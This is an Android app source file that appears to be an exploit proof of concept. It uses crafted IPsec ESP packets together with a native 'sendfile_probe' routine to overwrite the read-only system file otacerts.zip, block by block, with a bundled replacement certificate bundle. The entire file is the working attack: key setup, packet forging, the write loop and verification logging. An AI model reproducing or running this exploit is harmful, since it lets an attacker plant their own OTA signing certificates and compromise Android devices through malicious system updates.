package top.dcmqht.p780ipsec;

import android.app.Activity;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.Bundle;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.security.SecureRandom;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {
    private static final String TAG = "OtaPatch";
    private static final String TARGET = "/system/etc/security/otacerts.zip";

    static {
        System.loadLibrary("sendfile_probe");
    }

    private native String runSysWriteProbe(String path, int offset, int spi, int port,
                                           int seq, byte[] iv, byte[] tail, byte[] icv);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new Thread(new Runnable() {
            public void run() {
                MainActivity.this.run();
            }
        }, "ota-patch").start();
    }

    private byte[] readAll(String path) throws Exception {
        try (RandomAccessFile raf = new RandomAccessFile(path, "r")) {
            byte[] out = new byte[(int) raf.length()];
            raf.readFully(out);
            return out;
        }
    }

    private byte[] asset() throws Exception {
        try (InputStream in = getAssets().open("otacerts_ours.zip");
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
            return bos.toByteArray();
        }
    }

    private void run() {
        try {
            byte[] want = asset();
            byte[] orig = readAll(TARGET);
            Log.i(TAG, "target=" + TARGET + " len=" + orig.length + " want=" + want.length);
            if (want.length != orig.length) {
                Log.e(TAG, "length mismatch, abort");
                return;
            }

            IpSecManager manager = getSystemService(IpSecManager.class);
            InetAddress loopback = InetAddress.getByAddress(new byte[]{127, 0, 0, 1});
            byte[] encKey = new byte[16];
            byte[] authKey = new byte[32];
            new SecureRandom().nextBytes(encKey);
            new SecureRandom().nextBytes(authKey);
            IpSecManager.SecurityParameterIndex spi =
                    manager.allocateSecurityParameterIndex(loopback);
            IpSecManager.UdpEncapsulationSocket encap = manager.openUdpEncapsulationSocket();
            IpSecTransform transform = new IpSecTransform.Builder(this)
                    .setEncryption(new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, encKey))
                    .setAuthentication(new IpSecAlgorithm(
                            IpSecAlgorithm.AUTH_HMAC_SHA256, authKey, 128))
                    .setIpv4Encapsulation(encap, encap.getPort())
                    .buildTransportModeTransform(loopback, spi);
            Log.i(TAG, "sa ready spi=" + spi.getSpi() + " port=" + encap.getPort());

            int seq = 1;
            int offset = 0;
            int blocks = 0;
            while (offset < orig.length) {
                int len = Math.min(16, orig.length - offset);
                int at = (len == 16) ? offset : (orig.length - 16);
                if (at < 0) break;
                byte[] desired = new byte[16];
                System.arraycopy(want, at, desired, 0, Math.min(16, want.length - at));
                byte[] c1 = new byte[16];
                try (RandomAccessFile raf = new RandomAccessFile(TARGET, "r")) {
                    raf.seek(at);
                    raf.readFully(c1);
                }

                Cipher dec = Cipher.getInstance("AES/ECB/NoPadding");
                dec.init(Cipher.DECRYPT_MODE, new SecretKeySpec(encKey, "AES"));
                byte[] d1 = dec.doFinal(c1);
                byte[] iv = new byte[16];
                for (int i = 0; i < 16; i++) iv[i] = (byte) (d1[i] ^ desired[i]);

                byte[] p2 = new byte[16];
                p2[14] = 14;
                p2[15] = 17;
                byte[] x2 = new byte[16];
                for (int i = 0; i < 16; i++) x2[i] = (byte) (p2[i] ^ c1[i]);
                Cipher enc = Cipher.getInstance("AES/ECB/NoPadding");
                enc.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(encKey, "AES"));
                byte[] c2 = enc.doFinal(x2);

                byte[] hdr = new byte[8];
                int s = spi.getSpi();
                hdr[0] = (byte) (s >>> 24); hdr[1] = (byte) (s >>> 16);
                hdr[2] = (byte) (s >>> 8); hdr[3] = (byte) s;
                hdr[4] = (byte) (seq >>> 24); hdr[5] = (byte) (seq >>> 16);
                hdr[6] = (byte) (seq >>> 8); hdr[7] = (byte) seq;

                Mac mac = Mac.getInstance("HmacSHA256");
                mac.init(new SecretKeySpec(authKey, "HmacSHA256"));
                mac.update(hdr); mac.update(iv); mac.update(c1); mac.update(c2);
                byte[] icv = Arrays.copyOf(mac.doFinal(), 16);

                String rep = runSysWriteProbe(TARGET, at, spi.getSpi(), encap.getPort(),
                        seq, iv, c2, icv);
                Log.i(TAG, "block at=" + at + " seq=" + seq + " -> " + rep);
                seq++;
                blocks++;
                if (len < 16) break;
                offset += 16;
            }

            byte[] after = readAll(TARGET);
            Log.i(TAG, "after len=" + after.length + " match=" + Arrays.equals(after, want));
            if (!Arrays.equals(after, want)) {
                for (int i = 0; i < after.length; i++) {
                    if (after[i] != want[i]) {
                        Log.e(TAG, "first diff at " + i);
                        break;
                    }
                }
            }
            transform.close();
            encap.close();
            Log.i(TAG, "done blocks=" + blocks);
        } catch (Throwable t) {
            Log.e(TAG, "failed: " + Log.getStackTraceString(t));
        }
    }
}
